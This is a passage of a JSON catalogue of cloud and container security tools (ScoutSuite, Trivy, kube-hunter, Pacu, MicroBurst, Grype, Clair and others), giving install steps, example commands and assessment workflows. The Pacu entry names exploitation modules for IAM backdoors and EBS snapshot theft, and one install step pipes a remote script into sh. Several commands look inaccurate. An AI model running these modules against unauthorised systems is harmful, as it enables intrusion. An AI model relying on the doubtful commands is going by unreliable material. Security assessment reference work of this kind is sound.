            "copyable": true
          },
          {
            "detail": "# Mount volume for reports",
            "copyable": false
          },
          {
            "detail": "docker run -v $(pwd):/reports nccgroup/scoutsuite",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Scan AWS environment",
        "command": "scout aws",
        "notes": [
          "Requires AWS credentials",
          "Generates HTML report"
        ]
      },
      {
        "description": "Scan Azure environment",
        "command": "scout azure",
        "notes": [
          "Requires Azure authentication",
          "Interactive login prompt"
        ]
      }
    ],
    "step_sequences": [
      {
        "title": "Multi-Cloud Security Assessment",
        "steps": [
          {
            "title": "Configure cloud credentials",
            "details": "Set up credentials for each cloud provider",
            "command": "# AWS: aws configure, Azure: az login, GCP: gcloud auth login"
          },
          {
            "title": "Run cloud-specific scans",
            "details": "Execute ScoutSuite against each provider",
            "command": "scout azure && scout gcp && scout aws"
          },
          {
            "title": "Review findings",
            "details": "Analyze HTML reports for security issues",
            "command": "# Open generated report-*.html files"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Continuous Cloud Monitoring",
        "stages": [
          {
            "label": "Automate scans",
            "description": "Schedule regular ScoutSuite executions",
            "command": "# Use cron or cloud scheduler"
          },
          {
            "label": "Compare results",
            "description": "Track security posture changes over time",
            "command": "# Use diff tools on JSON outputs"
          },
          {
            "label": "Alert on changes",
            "description": "Set up notifications for new findings",
            "command": "# Integrate with SIEM or monitoring tools"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "Dangerous rule found",
        "meaning": "High-risk security configuration detected",
        "severity": "high"
      },
      {
        "indicator": "Warning rule found",
        "meaning": "Medium-risk security issue",
        "severity": "medium"
      },
      {
        "indicator": "Good rule found",
        "meaning": "Security best practice followed",
        "severity": "info"
      }
    ],
    "advanced_usage": [
      {
        "title": "Custom rules",
        "command": "scout --rules-dir custom_rules/",
        "scenario": "Add organization-specific security checks",
        "notes": [
          "Write custom Python rules",
          "Extend framework capabilities"
        ]
      }
    ],
    "resources": [
      {
        "label": "ScoutSuite GitHub",
        "url": "https://github.com/nccgroup/ScoutSuite",
        "description": "Official repository and documentation"
      },
      {
        "label": "Cloud Security Guides",
        "url": "https://cloud.google.com/security",
        "description": "Multi-cloud security best practices"
      }
    ]
  },
  {
    "id": "trivy",
    "name": "Trivy",
    "summary": "Trivy is a simple and comprehensive vulnerability scanner for containers and other artifacts. It detects OS packages and software dependencies in container images, file systems, and Git repositories.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Install from apt repository",
        "steps": [
          {
            "detail": "sudo apt-get install wget apt-transport-https gnupg lsb-release",
            "copyable": true
          },
          {
            "detail": "wget -qO - https://aquasecurity.github.io/trivy-repo/deb/public.key | sudo apt-key add -",
            "copyable": true
          },
          {
            "detail": "echo \"deb https://aquasecurity.github.io/trivy-repo/deb $(lsb_release -sc) main\" | sudo tee -a /etc/apt/sources.list.d/trivy.list",
            "copyable": true
          },
          {
            "detail": "sudo apt-get update",
            "copyable": true
          },
          {
            "detail": "sudo apt-get install trivy",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Install from binary",
        "steps": [
          {
            "detail": "wget https://github.com/aquasecurity/trivy/releases/latest/download/trivy_0.30.0_Linux-64bit.tar.gz",
            "copyable": true
          },
          {
            "detail": "tar zxvf trivy_0.30.0_Linux-64bit.tar.gz",
            "copyable": true
          },
          {
            "detail": "sudo mv trivy /usr/local/bin/",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Official Docker image",
        "steps": [
          {
            "detail": "docker pull aquasec/trivy:latest",
            "copyable": true
          },
          {
            "detail": "docker run --rm -v /var/run/docker.sock:/var/run/docker.sock aquasec/trivy image nginx:latest",
            "copyable": true
          },
          {
            "detail": "# For filesystem scanning",
            "copyable": false
          },
          {
            "detail": "docker run --rm -v /path/to/scan:/data aquasec/trivy fs /data",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Scan container image",
        "command": "trivy image nginx:latest",
        "notes": [
          "Scans for OS and application vulnerabilities",
          "Outputs severity levels and CVE details"
        ]
      },
      {
        "description": "Scan filesystem",
        "command": "trivy fs /path/to/directory",
        "notes": [
          "Scans local directories for vulnerabilities",
          "Useful for CI/CD pipeline integration"
        ]
      }
    ],
    "step_sequences": [
      {
        "title": "Container Security Assessment",
        "steps": [
          {
            "title": "Pull target image",
            "details": "Download the container image to scan",
            "command": "docker pull application:latest"
          },
          {
            "title": "Run vulnerability scan",
            "details": "Scan for known vulnerabilities",
            "command": "trivy image application:latest"
          },
          {
            "title": "Review findings",
            "details": "Analyze severity and impact of vulnerabilities",
            "command": "# Check CRITICAL and HIGH severity findings"
          },
          {
            "title": "Generate report",
            "details": "Export results for documentation",
            "command": "trivy image --format json --output report.json application:latest"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "CI/CD Pipeline Integration",
        "stages": [
          {
            "label": "Build stage",
            "description": "Build container image",
            "command": "docker build -t app:${BUILD_NUMBER} ."
          },
          {
            "label": "Security scan",
            "description": "Run Trivy vulnerability scan",
            "command": "trivy image --exit-code 1 app:${BUILD_NUMBER}"
          },
          {
            "label": "Deploy stage",
            "description": "Deploy if scan passes",
            "command": "docker push app:${BUILD_NUMBER}"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "CRITICAL: CVE-2023-1234",
        "meaning": "Critical vulnerability requiring immediate patching",
        "severity": "critical"
      },
      {
        "indicator": "HIGH: Outdated package version",
        "meaning": "Package has known high-severity vulnerabilities",
        "severity": "high"
      },
      {
        "indicator": "MEDIUM: Configuration issue",
        "meaning": "Security misconfiguration detected",
        "severity": "medium"
      }
    ],
    "advanced_usage": [
      {
        "title": "Custom policy checks",
        "command": "trivy image --policy policy.yaml app:latest",
        "scenario": "Define custom security policies",
        "notes": [
          "Create YAML policy files",
          "Enforce organizational security standards"
        ]
      }
    ],
    "resources": [
      {
        "label": "Trivy Documentation",
        "url": "https://github.com/aquasecurity/trivy",
        "description": "Official documentation and usage guide"
      },
      {
        "label": "Container Security Best Practices",
        "url": "https://aquasecurity.github.io/trivy/",
        "description": "Container security guidelines and tutorials"
      }
    ]
  },
  {
    "id": "kube-hunter",
    "name": "kube-hunter",
    "summary": "kube-hunter is a penetration testing tool for Kubernetes clusters. It can be used to test for vulnerabilities in Kubernetes clusters.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Install from pip",
        "steps": [
          {
            "detail": "sudo apt update",
            "copyable": true
          },
          {
            "detail": "pip install kube-hunter",
            "copyable": true
          },
          {
            "detail": "kube-hunter --version",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Install from source",
        "steps": [
          {
            "detail": "git clone https://github.com/aquasecurity/kube-hunter.git",
            "copyable": true
          },
          {
            "detail": "cd kube-hunter",
            "copyable": true
          },
          {
            "detail": "pip install -r requirements.txt",
            "copyable": true
          },
          {
            "detail": "python kube_hunter.py",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Run from Docker container",
        "steps": [
          {
            "detail": "docker pull aquasec/kube-hunter",
            "copyable": true
          },
          {
            "detail": "# Run from outside cluster",
            "copyable": false
          },
          {
            "detail": "docker run --rm aquasec/kube-hunter",
            "copyable": true
          },
          {
            "detail": "# Run from inside cluster",
            "copyable": false
          },
          {
            "detail": "docker run --rm aquasec/kube-hunter --pod",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Scan remote cluster",
        "command": "kube-hunter --remote 192.168.1.100",
        "notes": [
          "Scans external Kubernetes cluster",
          "Requires network access"
        ]
      },
      {
        "description": "Scan from within cluster",
        "command": "kube-hunter --pod",
        "notes": [
          "Runs inside a pod in the target cluster",
          "More comprehensive view"
        ]
      }
    ],
    "step_sequences": [
      {
        "title": "Kubernetes Security Assessment",
        "steps": [
          {
            "title": "Configure access",
            "details": "Set up kubeconfig or network access",
            "command": "export KUBECONFIG=~/.kube/config"
          },
          {
            "title": "Run reconnaissance",
            "details": "Discover cluster components",
            "command": "kube-hunter --list"
          },
          {
            "title": "Execute penetration test",
            "details": "Run comprehensive security scan",
            "command": "kube-hunter --remote cluster-ip"
          },
          {
            "title": "Analyze findings",
            "details": "Review vulnerabilities and recommendations",
            "command": "# Check report for high-severity issues"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Kubernetes Hardening Assessment",
        "stages": [
          {
            "label": "External scanning",
            "description": "Scan cluster from external network",
            "command": "kube-hunter --remote cluster-endpoint"
          },
          {
            "label": "Internal scanning",
            "description": "Deploy pod for internal assessment",
            "command": "kubectl apply -f https://raw.githubusercontent.com/aquasecurity/kube-hunter/master/job.yaml"
          },
          {
            "label": "Compare results",
            "description": "Analyze external vs internal findings",
            "command": "# Correlate findings from both perspectives"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "HIGH: Exposed dashboard",
        "meaning": "Kubernetes dashboard accessible without authentication",
        "severity": "high"
      },
      {
        "indicator": "MEDIUM: Privileged containers",
        "meaning": "Containers running with elevated privileges",
        "severity": "medium"
      },
      {
        "indicator": "LOW: Outdated components",
        "meaning": "Kubernetes components need updates",
        "severity": "low"
      }
    ],
    "advanced_usage": [
      {
        "title": "Custom hunting modules",
        "command": "kube-hunter --custom-modules /path/to/modules",
        "scenario": "Add organization-specific tests",
        "notes": [
          "Write custom hunting modules",
          "Extend framework capabilities"
        ]
      }
    ],
    "resources": [
      {
        "label": "kube-hunter Documentation",
        "url": "https://github.com/aquasecurity/kube-hunter",
        "description": "Official documentation and usage guide"
      },
      {
        "label": "Kubernetes Security",
        "url": "https://kubernetes.io/docs/concepts/security/",
        "description": "Kubernetes security best practices"
      }
    ]
  },
  {
    "id": "workflow_cloud_security_assessment",
    "name": "Cloud Security Assessment Workflow",
    "summary": "Comprehensive methodology for assessing cloud security posture across multiple providers, covering IAM configurations, misconfigurations, and data exposure risks.",
    "installation_guides": [],
    "quick_examples": [],
    "step_sequences": [
      {
        "title": "Cloud Security Assessment Methodology",
        "steps": [
          {
            "title": "Reconnaissance and Discovery",
            "details": "Identify cloud assets, accounts, and attack surface",
            "command": "# Use cloud provider consoles and enumeration tools"
          },
          {
            "title": "IAM and Access Control Analysis",
            "details": "Review permissions, roles, and access patterns",
            "command": "# Prowler, ScoutSuite for automated IAM analysis"
          },
          {
            "title": "Misconfiguration Assessment",
            "details": "Check for common security misconfigurations",
            "command": "# Cloud-specific scanners and compliance checks"
          },
          {
            "title": "Data Exposure Analysis",
            "details": "Identify potential data leakage points",
            "command": "# Review storage, databases, and data flows"
          },
          {
            "title": "Network Security Review",
            "details": "Analyze network configurations and flows",
            "command": "# VPC, security groups, firewall rules"
          },
          {
            "title": "Logging and Monitoring Assessment",
            "details": "Evaluate audit capabilities and alerting",
            "command": "# CloudTrail, Audit Logs, monitoring tools"
          },
          {
            "title": "Container and Orchestration Security",
            "details": "Assess container and Kubernetes security",
            "command": "# Trivy, kube-hunter for container scanning"
          },
          {
            "title": "Compliance and Governance Review",
            "details": "Check compliance with standards and regulations",
            "command": "# CIS benchmarks, industry standards"
          },
          {
            "title": "Remediation Planning",
            "details": "Prioritize findings and create remediation plan",
            "command": "# Risk assessment and remediation roadmap"
          },
          {
            "title": "Reporting and Documentation",
            "details": "Generate comprehensive security assessment report",
            "command": "# Executive summary and technical findings"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Multi-Provider Assessment Strategy",
        "stages": [
          {
            "label": "Provider Selection",
            "description": "Identify all cloud providers in use",
            "command": "# Inventory AWS, Azure, GCP accounts"
          },
          {
            "label": "Tool Deployment",
            "description": "Deploy appropriate scanning tools",
            "command": "# Prowler for AWS, ScoutSuite for multi-cloud"
          },
          {
            "label": "Cross-Provider Analysis",
            "description": "Identify cross-cloud security issues",
            "command": "# Review inter-cloud connections and data flows"
          },
          {
            "label": "Unified Reporting",
            "description": "Consolidate findings across providers",
            "command": "# Generate unified risk assessment"
          }
        ]
      },
      {
        "name": "Continuous Cloud Security Monitoring",
        "stages": [
          {
            "label": "Baseline Establishment",
            "description": "Create security baseline for each environment",
            "command": "# Initial comprehensive assessment"
          },
          {
            "label": "Automated Scanning",
            "description": "Set up regular automated scans",
            "command": "# Schedule Prowler, ScoutSuite executions"
          },
          {
            "label": "Change Detection",
            "description": "Monitor for security configuration changes",
            "command": "# CloudTrail, audit log analysis"
          },
          {
            "label": "Alerting and Response",
            "description": "Implement security alerting and response",
            "command": "# SIEM integration, automated responses"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "Critical: Public data exposure",
        "meaning": "Sensitive data accessible from internet",
        "severity": "critical"
      },
      {
        "indicator": "High: Over-privileged IAM roles",
        "meaning": "Excessive permissions granted to identities",
        "severity": "high"
      },
      {
        "indicator": "Medium: Missing encryption",
        "meaning": "Data not encrypted at rest or in transit",
        "severity": "medium"
      },
      {
        "indicator": "Low: Inadequate logging",
        "meaning": "Insufficient audit trail for security events",
        "severity": "low"
      }
    ],
    "advanced_usage": [
      {
        "title": "Automated Remediation",
        "command": "# Use cloud-native automation services",
        "scenario": "Implement automatic fixes for common issues",
        "notes": [
          "AWS Lambda functions for auto-remediation",
          "Azure Functions for automated responses",
          "Cloud Functions for GCP automation"
        ]
      },
      {
        "title": "DevSecOps Integration",
        "command": "# Integrate security into CI/CD pipelines",
        "scenario": "Shift-left cloud security testing",
        "notes": [
          "Infrastructure as Code security scanning",
          "Automated compliance checks",
          "Security gate enforcement"
        ]
      }
    ],
    "comparison_table": {
      "caption": "Cloud Security Assessment Tools Comparison",
      "columns": [
        "Tool",
        "Cloud Providers",
        "Automation",
        "Compliance",
        "Customization"
      ],
      "rows": [
        [
          "Prowler",
          "AWS, Azure, GCP",
          "High",
          "CIS, NIST, GDPR",
          "Medium"
        ],
        [
          "ScoutSuite",
          "AWS, Azure, GCP, Oracle",
          "Medium",
          "Custom rules",
          "High"
        ],
        [
          "CloudMapper",
          "AWS",
          "Low",
          "None",
          "High"
        ],
        [
          "Pacu",
          "AWS",
          "High",
          "None",
          "High"
        ]
      ]
    },
    "resources": [
      {
        "label": "Cloud Security Alliance",
        "url": "https://cloudsecurityalliance.org/",
        "description": "Cloud security best practices and guidance"
      },
      {
        "label": "CIS Cloud Benchmarks",
        "url": "https://www.cisecurity.org/cis-benchmarks/",
        "description": "Center for Internet Security cloud benchmarks"
      },
      {
        "label": "NIST Cloud Security",
        "url": "https://www.nist.gov/cloud-computing",
        "description": "NIST cloud security guidelines and standards"
      }
    ]
  },
  {
    "id": "cloudmapper",
    "name": "CloudMapper",
    "summary": "CloudMapper helps you analyze your Amazon Web Services (AWS) environments. It was originally created by Duo Security and is now maintained by the community.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Install from pip",
        "steps": [
          {
            "detail": "sudo apt update",
            "copyable": true
          },
          {
            "detail": "pip install cloudmapper",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Install from source",
        "steps": [
          {
            "detail": "git clone https://github.com/duo-labs/cloudmapper.git",
            "copyable": true
          },
          {
            "detail": "cd cloudmapper",
            "copyable": true
          },
          {
            "detail": "pip install -r requirements.txt",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Run from Docker",
        "steps": [
          {
            "detail": "docker pull duosecurity/cloudmapper",
            "copyable": true
          },
          {
            "detail": "docker run -it duosecurity/cloudmapper",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Collect AWS data",
        "command": "cloudmapper.py collect --account 123456789012",
        "notes": ["Collects configuration data from AWS account"]
      },
      {
        "description": "Generate network diagram",
        "command": "cloudmapper.py visualize --account 123456789012",
        "notes": ["Creates interactive HTML network visualization"]
      }
    ],
    "step_sequences": [
      {
        "title": "AWS Network Visualization",
        "steps": [
          {
            "title": "Configure AWS credentials",
            "details": "Set up AWS CLI credentials",
            "command": "aws configure"
          },
          {
            "title": "Collect account data",
            "details": "Gather configuration from AWS",
            "command": "cloudmapper.py collect --account your-account"
          },
          {
            "title": "Generate visualization",
            "details": "Create network diagram",
            "command": "cloudmapper.py visualize --account your-account"
          },
          {
            "title": "Review findings",
            "details": "Analyze network topology",
            "command": "# Open web/index.html"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Multi-Account Analysis",
        "stages": [
          {
            "label": "Data collection",
            "description": "Collect data from all AWS accounts",
            "command": "cloudmapper.py collect --all-profiles"
          },
          {
            "label": "Visualization",
            "description": "Generate network diagrams",
            "command": "cloudmapper.py visualize --all-profiles"
          },
          {
            "label": "Security review",
            "description": "Analyze network security posture",
            "command": "# Review network exposures and connections"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "Public subnet exposed",
        "meaning": "Subnet has direct internet access",
        "severity": "medium"
      },
      {
        "indicator": "VPC peering connection",
        "meaning": "Network connection between VPCs",
        "severity": "info"
      }
    ],
    "advanced_usage": [
      {
        "title": "Custom inventory filtering",
        "command": "cloudmapper.py collect --filter-tag Environment:Production",
        "scenario": "Focus on specific resources",
        "notes": ["Filter by tags for targeted analysis"]
      }
    ],
    "resources": [
      {
        "label": "CloudMapper GitHub",
        "url": "https://github.com/duo-labs/cloudmapper",
        "description": "Official repository and documentation"
      }
    ]
  },
  {
    "id": "pacu",
    "name": "Pacu",
    "summary": "Pacu is an AWS exploitation framework, designed for testing the security of Amazon Web Services environments.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Install from source",
        "steps": [
          {
            "detail": "sudo apt update",
            "copyable": true
          },
          {
            "detail": "git clone https://github.com/RhinoSecurityLabs/pacu.git",
            "copyable": true
          },
          {
            "detail": "cd pacu",
            "copyable": true
          },
          {
            "detail": "pip install -r requirements.txt",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Install from source with dependencies",
        "steps": [
          {
            "detail": "git clone https://github.com/RhinoSecurityLabs/pacu.git",
            "copyable": true
          },
          {
            "detail": "cd pacu",
            "copyable": true
          },
          {
            "detail": "bash install.sh",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Run from Docker container",
        "steps": [
          {
            "detail": "docker pull rhinosecuritylabs/pacu",
            "copyable": true
          },
          {
            "detail": "docker run -it rhinosecuritylabs/pacu",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Start Pacu interactive session",
        "command": "python3 pacu.py",
        "notes": ["Launches the Pacu exploitation framework"]
      },
      {
        "description": "Run reconnaissance module",
        "command": "run whoami",
        "notes": ["Check current AWS identity and permissions"]
      }
    ],
    "step_sequences": [
      {
        "title": "AWS Penetration Testing",
        "steps": [
          {
            "title": "Configure AWS credentials",
            "details": "Set up target AWS credentials",
            "command": "aws configure"
          },
          {
            "title": "Start Pacu framework",
            "details": "Launch the exploitation framework",
            "command": "python3 pacu.py"
          },
          {
            "title": "Run reconnaissance",
            "details": "Identify attack surface",
            "command": "run whoami"
          },
          {
            "title": "Execute exploitation modules",
            "details": "Run specific attack modules",
            "command": "run ebs__download_snapshot"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Privilege Escalation Testing",
        "stages": [
          {
            "label": "Enumerate permissions",
            "description": "Check current IAM permissions",
            "command": "run iam__enum_permissions"
          },
          {
            "label": "Identify escalation paths",
            "description": "Find privilege escalation opportunities",
            "command": "run iam__privesc_scan"
          },
          {
            "label": "Exploit vulnerabilities",
            "description": "Execute privilege escalation",
            "command": "run iam__backdoor_assume_role"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "Admin access detected",
        "meaning": "Current credentials have administrative privileges",
        "severity": "high"
      },
      {
        "indicator": "Privilege escalation possible",
        "meaning": "Path to higher privileges identified",
        "severity": "high"
      }
    ],
    "advanced_usage": [
      {
        "title": "Custom module development",
        "command": "# Create modules in /pacu/modules/",
        "scenario": "Develop custom exploitation modules",
        "notes": ["Follow Pacu module development guidelines"]
      }
    ],
    "resources": [
      {
        "label": "Pacu GitHub",
        "url": "https://github.com/RhinoSecurityLabs/pacu",
        "description": "Official repository and documentation"
      }
    ]
  },
  {
    "id": "microburst",
    "name": "MicroBurst",
    "summary": "MicroBurst is a collection of scripts for assessing Microsoft Azure security.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Install from source",
        "steps": [
          {
            "detail": "sudo apt update",
            "copyable": true
          },
          {
            "detail": "git clone https://github.com/NetSPI/MicroBurst.git",
            "copyable": true
          },
          {
            "detail": "cd MicroBurst",
            "copyable": true
          },
          {
            "detail": "pip install -r requirements.txt",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Install with PowerShell modules",
        "steps": [
          {
            "detail": "git clone https://github.com/NetSPI/MicroBurst.git",
            "copyable": true
          },
          {
            "detail": "cd MicroBurst",
            "copyable": true
          },
          {
            "detail": "Import-Module .\\MicroBurst.psm1",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Run in PowerShell environment",
        "steps": [
          {
            "detail": "# Requires PowerShell Core",
            "copyable": false
          },
          {
            "detail": "pwsh -File MicroBurst.ps1",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Run Azure reconnaissance",
        "command": "Invoke-AzureRecon",
        "notes": ["Performs comprehensive Azure reconnaissance"]
      },
      {
        "description": "Check for storage account access",
        "command": "Get-AzureStorageInfo",
        "notes": ["Enumerates accessible storage accounts"]
      }
    ],
    "step_sequences": [
      {
        "title": "Azure Security Assessment",
        "steps": [
          {
            "title": "Authenticate to Azure",
            "details": "Connect to Azure subscription",
            "command": "Connect-AzAccount"
          },
          {
            "title": "Run reconnaissance",
            "details": "Enumerate Azure resources",
            "command": "Invoke-AzureRecon"
          },
          {
            "title": "Analyze findings",
            "details": "Review security issues",
            "command": "# Check output for vulnerabilities"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Azure Tenant Assessment",
        "stages": [
          {
            "label": "Tenant enumeration",
            "description": "Discover Azure AD configuration",
            "command": "Get-AzureDomainInfo"
          },
          {
            "label": "Resource enumeration",
            "description": "List all accessible resources",
            "command": "Invoke-AzureRecon"
          },
          {
            "label": "Security analysis",
            "description": "Identify security misconfigurations",
            "command": "# Review findings and recommendations"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "Public storage account",
        "meaning": "Storage account accessible from internet",
        "severity": "high"
      },
      {
        "indicator": "Weak authentication",
        "meaning": "Authentication mechanism vulnerable",
        "severity": "medium"
      }
    ],
    "advanced_usage": [
      {
        "title": "Custom scripts",
        "command": "# Extend MicroBurst with custom modules",
        "scenario": "Develop organization-specific tests",
        "notes": ["Follow PowerShell module patterns"]
      }
    ],
    "resources": [
      {
        "label": "MicroBurst GitHub",
        "url": "https://github.com/NetSPI/MicroBurst",
        "description": "Official repository and documentation"
      }
    ]
  },
  {
    "id": "gcp-enum",
    "name": "GCP-Enum",
    "summary": "GCP-Enum is a multi-threaded GCP security enumeration tool designed to make GCP security testing more efficient.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Install from source",
        "steps": [
          {
            "detail": "sudo apt update",
            "copyable": true
          },
          {
            "detail": "git clone https://github.com/RhinoSecurityLabs/GCPSecurityResearch.git",
            "copyable": true
          },
          {
            "detail": "cd GCPSecurityResearch/GCP-Enum",
            "copyable": true
          },
          {
            "detail": "pip install -r requirements.txt",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Install dependencies and run",
        "steps": [
          {
            "detail": "git clone https://github.com/RhinoSecurityLabs/GCPSecurityResearch.git",
            "copyable": true
          },
          {
            "detail": "cd GCPSecurityResearch/GCP-Enum",
            "copyable": true
          },
          {
            "detail": "pip install -r requirements.txt",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Run with gcloud CLI",
        "steps": [
          {
            "detail": "gcloud auth login",
            "copyable": true
          },
          {
            "detail": "gcloud config set project your-project-id",
            "copyable": true
          },
          {
            "detail": "python3 gcp_enum.py",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Run GCP enumeration",
        "command": "python3 gcp_enum.py",
        "notes": ["Enumerates all accessible GCP resources"]
      },
      {
        "description": "Check specific project",
        "command": "python3 gcp_enum.py -p project-id",
        "notes": ["Targets specific GCP project"]
      }
    ],
    "step_sequences": [
      {
        "title": "GCP Security Assessment",
        "steps": [
          {
            "title": "Configure GCP credentials",
            "details": "Set up GCP authentication",
            "command": "gcloud auth login"
          },
          {
            "title": "Set target project",
            "details": "Specify GCP project to assess",
            "command": "gcloud config set project project-id"
          },
          {
            "title": "Run enumeration",
            "details": "Enumerate GCP resources",
            "command": "python3 gcp_enum.py"
          },
          {
            "title": "Review findings",
            "details": "Analyze security issues",
            "command": "# Check output for vulnerabilities"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Multi-Project Analysis",
        "stages": [
          {
            "label": "Project discovery",
            "description": "List all accessible projects",
            "command": "gcloud projects list"
          },
          {
            "label": "Enumerate each project",
            "description": "Run enumeration on all projects",
            "command": "python3 gcp_enum.py -a"
          },
          {
            "label": "Consolidate findings",
            "description": "Aggregate security findings",
            "command": "# Review combined output"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "Public bucket",
        "meaning": "Cloud Storage bucket publicly accessible",
        "severity": "high"
      },
      {
        "indicator": "Open firewall rule",
        "meaning": "Firewall allows unrestricted access",
        "severity": "medium"
      }
    ],
    "advanced_usage": [
      {
        "title": "Custom service enumeration",
        "command": "python3 gcp_enum.py -s compute",
        "scenario": "Focus on specific GCP services",
        "notes": ["Target specific services for deeper analysis"]
      }
    ],
    "resources": [
      {
        "label": "GCP-Enum GitHub",
        "url": "https://github.com/RhinoSecurityLabs/GCPSecurityResearch",
        "description": "Official repository and documentation"
      }
    ]
  },
  {
    "id": "grype",
    "name": "Grype",
    "summary": "Grype is a vulnerability scanner for container images and filesystems. It scans for known vulnerabilities in operating system packages and application dependencies.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Install from binary",
        "steps": [
          {
            "detail": "curl -sSfL https://raw.githubusercontent.com/anchore/grype/main/install.sh | sh -s -- -b /usr/local/bin",
            "copyable": true
          },
          {
            "detail": "grype version",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Install from source",
        "steps": [
          {
            "detail": "git clone https://github.com/anchore/grype.git",
            "copyable": true
          },
          {
            "detail": "cd grype",
            "copyable": true
          },
          {
            "detail": "go build -o grype cmd/grype/main.go",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Run from Docker",
        "steps": [
          {
            "detail": "docker pull anchore/grype:latest",
            "copyable": true
          },
          {
            "detail": "docker run --rm -v /var/run/docker.sock:/var/run/docker.sock anchore/grype:latest image nginx:latest",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Scan container image",
        "command": "grype nginx:latest",
        "notes": ["Scans nginx image for vulnerabilities"]
      },
      {
        "description": "Scan directory",
        "command": "grype dir:/path/to/app",
        "notes": ["Scans local directory for vulnerabilities"]
      }
    ],
    "step_sequences": [
      {
        "title": "Container Vulnerability Scanning",
        "steps": [
          {
            "title": "Pull target image",
            "details": "Download container image",
            "command": "docker pull application:latest"
          },
          {
            "title": "Run vulnerability scan",
            "details": "Scan for known vulnerabilities",
            "command": "grype application:latest"
          },
          {
            "title": "Review findings",
            "details": "Analyze vulnerability results",
            "command": "# Check severity levels and CVEs"
          },
          {
            "title": "Generate report",
            "details": "Export scan results",
            "command": "grype application:latest -o json > report.json"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "CI/CD Integration",
        "stages": [
          {
            "label": "Build image",
            "description": "Build container image",
            "command": "docker build -t app:${BUILD_NUMBER} ."
          },
          {
            "label": "Security scan",
            "description": "Run Grype vulnerability scan",
            "command": "grype app:${BUILD_NUMBER} --fail-on high"
          },
          {
            "label": "Deploy if safe",
            "description": "Deploy if no high-severity issues",
            "command": "docker push app:${BUILD_NUMBER}"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "CVE-2023-1234",
        "meaning": "Specific vulnerability identified",
        "severity": "high"
      },
      {
        "indicator": "No vulnerabilities found",
        "meaning": "Image appears secure",
        "severity": "info"
      }
    ],
    "advanced_usage": [
      {
        "title": "Custom vulnerability database",
        "command": "grype app:latest --db /path/to/custom-db",
        "scenario": "Use custom vulnerability data",
        "notes": ["Integrate with internal vulnerability feeds"]
      }
    ],
    "resources": [
      {
        "label": "Grype Documentation",
        "url": "https://github.com/anchore/grype",
        "description": "Official repository and documentation"
      }
    ]
  },
  {
    "id": "clair",
    "name": "Clair",
    "summary": "Clair is an open source project for the static analysis of vulnerabilities in application containers.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Run with Docker Compose",
        "steps": [
          {
            "detail": "docker-compose up -d",
            "copyable": true
          },
          {
            "detail": "# Uses pre-configured docker-compose.yml",
            "copyable": false
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Install from source",
        "steps": [
          {
            "detail": "git clone https://github.com/quay/clair.git",
            "copyable": true
          },
          {
            "detail": "cd clair",
            "copyable": true
          },
          {
            "detail": "go build -o clair ./cmd/clair",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Official Docker image",
        "steps": [
          {
            "detail": "docker pull quay.io/coreos/clair:v4.4.0",
            "copyable": true
          },
          {
            "detail": "docker run -d --name clair -p 6060:6060 quay.io/coreos/clair:v4.4.0",
